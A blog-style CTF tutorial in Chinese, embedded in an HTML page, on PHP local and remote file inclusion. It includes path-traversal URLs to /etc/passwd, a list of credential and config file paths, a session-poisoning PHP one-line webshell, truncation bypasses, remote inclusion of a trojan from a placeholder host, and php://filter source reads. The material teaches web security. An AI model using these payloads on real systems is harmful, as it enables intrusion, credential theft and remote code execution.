@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html lang="en-uk" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Local/Remote File Inclusion 文件包含漏洞 参考文章：Web安全实战系列：文件包含漏洞 文件包含是什么？我们为什么要使用它？ 文件包含在网页开发中会经常被使用到，比如导航'><title>Local/Remote File Inclusion 文件包含漏洞</title>
+
+<link rel='canonical' href='https://ginkgo.org.cn/posts/lrfi_basic/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='Local/Remote File Inclusion 文件包含漏洞'>
+<meta property='og:description' content='Local/Remote File Inclusion 文件包含漏洞 参考文章：Web安全实战系列：文件包含漏洞 文件包含是什么？我们为什么要使用它？ 文件包含在网页开发中会经常被使用到，比如导航'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/lrfi_basic/'>
+<meta property='og:site_name' content='Under The Ginkgo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='file_inclusion' /><meta property='article:tag' content='ctf' /><meta property='article:published_time' content='2022-05-21T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-21T23:47:36&#43;01:00'/>
+<meta name="twitter:title" content="Local/Remote File Inclusion 文件包含漏洞">
+<meta name="twitter:description" content="Local/Remote File Inclusion 文件包含漏洞 参考文章：Web安全实战系列：文件包含漏洞 文件包含是什么？我们为什么要使用它？ 文件包含在网页开发中会经常被使用到，比如导航">
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
+                            height="237" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧐</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
+            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/medic0803'
+                        target="_blank"
+                        title="A_GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:medicwrf@gmail.com'
+                        target="_blank"
+                        title="B_E-mail"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/lrfi_basic/">Local/Remote File Inclusion 文件包含漏洞</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 21, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    5 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="local-remote-file-inclusion-文件包含漏洞">Local/Remote File Inclusion 文件包含漏洞</h2>
+<p>参考文章：<a class="link" href="https://www.freebuf.com/articles/web/182280.html"  target="_blank" rel="noopener"
+    >Web安全实战系列：文件包含漏洞</a> <!-- raw HTML omitted --></p>
+<h3 id="文件包含是什么-我们为什么要使用它">文件包含是什么？我们为什么要使用它？</h3>
+<p>文件包含在网页开发中会经常被使用到，比如导航栏，亦或是页眉，往往都是单独的一个php文件，然后每一个页面只需要将这个php文件包含进来而节省了重复开发的时间，还有一种常见的形式就是sql连接，大家在搭建靶场的时候相信经常都会遇到的配置问题，例如修改端口号，Mysql账号密码等，都可以在一个专门的php文件中修改，而不是需要在每一个sql连接的地方去做修改。 <!-- raw HTML omitted --></p>
+<p>PHP文件包含函数： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">require</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">include_once</span><span class="p">()</span>
+</span></span></code></pre></div><p><code>include()</code> 和 <code>require</code> 的却别在于当包含过程中处理错误的方式，include会抛出警告，程序正常运行；而require会选择直接报错并且退出程序的执行 <!-- raw HTML omitted --></p>
+<p>两个once都表示文件只包含一次，为了避免重复包含带来的函数重定义。 <!-- raw HTML omitted --></p>
+<h3 id="文件包含漏洞产生的原因">文件包含漏洞产生的原因</h3>
+<p>对于用户的输入没有做严格的审核，还是这个老问题，包含的文件需要用户的输入，那么如果没有经过严格的审核，被黑客包含了其他恶意的文件，亦或是被利用执行了额外的代码，就会造成危害。 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>例如这里这个GET参数，就可以轻易被修改（修改url即可） <!-- raw HTML omitted --></p>
+<h3 id="local-file-inclusion-本地文件包含漏洞">Local File Inclusion 本地文件包含漏洞</h3>
+<p>本地文件包含漏洞，这里“本地”指的是服务器本地，主要是利用目录遍历的手法加上操作系统常见的敏感文件路径来读取信息 <!-- raw HTML omitted --></p>
+<p>Windows系统 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c:\boot.ini // 查看系统版本
+</span></span><span class="line"><span class="cl">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
+</span></span><span class="line"><span class="cl">c:\windows\repair\sam // 存储Windows系统初次安装的密码
+</span></span><span class="line"><span class="cl">c:\ProgramFiles\mysql\my.ini // MySQL配置
+</span></span><span class="line"><span class="cl">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
+</span></span><span class="line"><span class="cl">c:\windows\php.ini // php 配置信息
+</span></span></code></pre></div><p>*inux 系统 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/passwd // 账户信息
+</span></span><span class="line"><span class="cl">/etc/shadow // 账户密码文件
+</span></span><span class="line"><span class="cl">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
+</span></span><span class="line"><span class="cl">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
+</span></span><span class="line"><span class="cl">/usr/local/app/php5/lib/php.ini // PHP相关配置
+</span></span><span class="line"><span class="cl">/etc/httpd/conf/httpd.conf // Apache配置文件
+</span></span><span class="line"><span class="cl">/etc/my.conf // mysql 配置文件
+</span></span></code></pre></div><p>利用的形式大致如此： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www.example.org/index.php?filename=../../../../../../../etc/passwd
+</span></span></code></pre></div><h4 id="session-文件包含漏洞">Session 文件包含漏洞</h4>
+<p>Session文件包含漏洞一般发生在用户输入将会存入session文件中，我们可以通过植入恶意代码到session文件中，然后执行session文件让里面的恶意代码被解析然后执行 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ctfs</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctfs&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span><span class="o">=</span><span class="nv">$ctfs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>我们可以通过phpinfo获取我们本地的session存储位置，然后猜测目标服务器的session存放地址 <!-- raw HTML omitted -->
+假设为/Applications/MAMP/tmp/php <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-21_10-12-56_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>然后我们可以将恶意代码当作参数执行 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/session.php?ctfs=&lt;?php phpinfo();?&gt;
+</span></span></code></pre></div><p>然后通过浏览器的开发者工具确认cookie的名字 <!-- raw HTML omitted --></p>
+<p>接着在本地查看我们的恶意代码是否注入成功 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-21_10-18-11_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-21_10-16-51_screenshot.png" width="400px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>接着可以执行恶意代码，phpinfo显示成功 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-21_10-20-16_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>同样我们也可以注入一句话木马 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiSession.php?ctfs=&lt;?php @eval($_POST[&#34;a&#34;]);?&gt;
+</span></span></code></pre></div><p>然后用蚁剑连接成功 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-21_10-24-26_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<h4 id="常见限制绕过">常见限制绕过</h4>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>%00截断</p>
+<p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&#34;.html&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>通过添加%00截断后面的html <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>路径长度截断</p>
+<p>条件：windows OS，点号需要长于256；linux OS 长于4096: <!-- raw HTML omitted --></p>
+<ul>
+<li>Windows下目录最大长度为256字节，超出的部分会被丢弃； <!-- raw HTML omitted --></li>
+<li>Linux下目录最大长度为4096字节，超出的部分会被丢弃。 <!-- raw HTML omitted --></li>
+</ul>
+<p>沿用上一个例子，将html超出范围后舍弃 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&#34;.html&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
+</span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>点号截断</p>
+<p>条件：windows OS，点号需要长于256 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&#34;.html&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="remote-file-inclusion-远程文件包含漏洞">Remote File Inclusion 远程文件包含漏洞</h3>
+<p>远程文件包含漏洞，这里的“远程”指的是包含服务器以外的远程文件 <!-- raw HTML omitted --></p>
+<p>漏洞执行条件 <!-- raw HTML omitted -->
+这里需要满足两个参数的开启 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">allow_url_fopen = On（是否允许打开远程文件）
+</span></span><span class="line"><span class="cl">allow_url_include = On（是否允许include/require远程文件）
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php
+</span></span></code></pre></div><h4 id="常见绕过">常见绕过</h4>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>问号绕过</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php?
+</span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>#绕过</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php#
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="php-supported-protocols-and-wrappers-php伪协议">PHP Supported Protocols and Wrappers PHP伪协议</h3>
+<p>PHP伪协议主要是一系列以与URI scheme的外形相似的封装协议，用来与 <code>fopen()</code>, <code>copy()</code>, <code>file_exists()</code>, <code>filesize()</code> 配合使用，同时也可以用 <code>stream_wrapper_register()</code> 创造新的方法。 <!-- raw HTML omitted --></p>
+<p>PHP只接受 <code>scheme://...</code> 的形式，而 <code>scheme:/...</code>, <code>scheme:...</code> 都不行 <!-- raw HTML omitted --></p>
+<p>在CTF中的运用，个人目前的理解是，当服务器端存在需要用户输入的参数，并且调用这个参数的函数可以与PHP伪协议连用，那么就可以通过PHP伪协议来构造一些PHP操作来实现恶意行为（相当于在写php代码） <!-- raw HTML omitted --></p>
+<ul>
+<li>&lt;//&gt; — Accessing local filesystem <!-- raw HTML omitted --></li>
+<li><a class="link" href="http://"  target="_blank" rel="noopener"
+    >http://</a> — Accessing HTTP(s) URLs <!-- raw HTML omitted --></li>
+<li><a class="link" href="ftp://" >ftp://</a> — Accessing FTP(s) URLs <!-- raw HTML omitted --></li>
+<li>php:// — Accessing various I/O streams <!-- raw HTML omitted --></li>
+<li>zlib:// — Compression Streams <!-- raw HTML omitted --></li>
+<li>data:// — Data (RFC 2397) <!-- raw HTML omitted --></li>
+<li>glob:// — Find pathnames matching pattern <!-- raw HTML omitted --></li>
+<li>phar:// — PHP Archive <!-- raw HTML omitted --></li>
+<li>ssh2:// — Secure Shell 2 <!-- raw HTML omitted --></li>
+<li>rar:// — RAR <!-- raw HTML omitted --></li>
+<li>ogg:// — Audio streams <!-- raw HTML omitted --></li>
+<li>expect:// — Process Interaction Streams <!-- raw HTML omitted --></li>
+</ul>
+<h4 id="php">php://</h4>
+<p>php:// 伪协议可以访问PHP自己的输入和输出流以及错误描述描述符，还有访问内存和磁盘备份的临时文件流以及过滤器来决定想要访问的读写文件资源 <!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>php://stdin, php://stdout 和 php://stderr</p>
+<p>使用php://stdin, php://stdout 和 php://stderr可以直接访问PHP进行所对应的输入或者输出流，访问的时候使用的是引用的文件描述符，而真正的STDIN是不会收到影响的 <!-- raw HTML omitted --></p>
+<p>php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。 <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>php://filter</p>
+<p><code>php://filter</code> 可以与 <code>readfile()</code>, <code>file()</code>, <code>file_get_contents()</code> 函数进行配合使用，用来读取本地磁盘文件，它可以在打开文件时对文件内容进行处理 <!-- raw HTML omitted --></p>
+<p>条件：Read-only只读，需要开启 allow_url_fopen，不需要开启 allow_url_include； <!-- raw HTML omitted --></p>
+<p>可以使用参数来指定过滤的方式 <!-- raw HTML omitted --></p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td>read=&lt;读链的筛选列表&gt;</td>
+<td>该参数可选。可以设定一个或多个过滤器名称，以管道符分隔。</td>
+</tr>
+<tr>
+<td>write=&lt;写链的筛选列表&gt;</td>
+<td>该参数可选。可以设定一个或多个过滤器名称，以管道符分隔。</td>
+</tr>
+<tr>
+<td>&lt;；两个链的筛选列表&gt;</td>
+<td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody>
+</table></div>
+<p>试一下试试 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>这里我们通过 <code>php://filter</code> 可以得到 <code>lrfiSession.php</code> 中以base64加密的内容，然后再解密得到其明文内容 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=php://filter/read=convert.base64-encode/resource=lrfiSession.php
+</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-21_22-56-31_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-21_23-00-43_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+</li>
+</ul>
